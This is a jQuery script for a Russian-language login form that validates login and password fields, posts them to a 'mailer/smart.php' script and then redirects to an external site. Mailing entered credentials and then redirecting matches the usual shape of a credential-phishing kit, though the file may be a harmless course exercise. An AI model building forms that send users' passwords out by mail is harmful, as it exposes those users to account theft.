$(document).ready(function(){
	const urlAction = "mailer/smart.php"
	var url = "https://pulse.forgetsmd.ru/";

	$('input.form__input').focus(function() {
		$(this).closest('div.form__item').find('span.form__span').removeClass('form__span_active').eq($(this).index()).addClass('form__span_active');
	});

	$('input.form__input').blur(function() {
		$(this).closest('div.form__item').find('span.form__span').eq($(this).index()).removeClass('form__span_active');
	});


	$('form').validate({
		rules: {
			login: "required",
			password: "required"
		},
		messages: {
			login: "Пожалуйста, введите свой логин",
			password: "Пожалуйста, введите свой пароль"
		},
		highlight: function (element, errorClass) {
			$(element).addClass('error');
			$(element).closest('div.form__item').find('span.form__span').addClass('form__span_red');
		},
		unhighlight: function (element, errorClass) {
			$(element).removeClass('error');
			$(element).closest('div.form__item').find('span.form__span').removeClass('form__span_red');
		}
	});

	$('form').submit(function(e) {
		e.preventDefault();

		if(!$(this).valid()) {
			return;
		}
		console.log('validation_submit');
		$.ajax({
			type: "POST",
			url: urlAction,
			data: $(this).serialize()
		}).done(function() {
			$(this).find("input").val("");
			$('form').trigger('reset');
			$(location).attr('href',url);
		})
		return false;
	});
});
